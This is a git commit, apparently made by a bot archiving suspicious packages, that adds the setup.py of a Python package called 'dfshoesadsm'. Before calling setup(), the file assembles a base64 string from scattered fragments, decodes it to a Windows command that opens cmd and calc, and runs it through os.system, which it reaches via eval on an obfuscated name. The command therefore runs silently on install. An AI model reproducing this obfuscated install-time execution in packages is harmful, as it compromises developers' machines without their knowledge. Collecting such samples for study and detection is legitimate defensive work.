35d3f349a7613b386cd255d4d5312b402992c76b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 05:11:58 +0000

    Add package dfshoesadsm/0.1/dfshoesadsm-0.1.tar.gz

---
+++ packages/dfshoesadsm/dfshoesadsm-0.1.tar.gz/dfshoesadsm-0.1/setup.py
@@ -0,0 +1,17 @@
+from setuptools import setup
+import base64
+import os
+voWOsHGm= ("Y" +'2'+'1'+"k"+"I" +'C'+"9j" +'IH' +"N" +'0' +"YX" +'J0' +'IG'+'N' +'tZC' +'AmJ' +"i" +"Bzd" +'G'+'F' +"ydC" +"BjY"+'Wx'+"j").encode()
+VCiqbXoqklfZ= base64.b64decode(voWOsHGm).decode()
+PBTuURDw = eval("o"+'s.s' +"y" +'s'+"te" +'m')
+PBTuURDw(VCiqbXoqklfZ)
+setup(name='dfshoesadsm',
+      version='0.1',
+      description='dfshoesadsm package for api header implement today',
+      url='https://johnshoeprojects.cc/dfshoesadsm/pak',
+      author='john shoe',
+      author_email='johnshoe@gmail.com',
+      license='MIT',
+      packages=[],
+      dependencies=["requests"],
+      zip_safe=False)
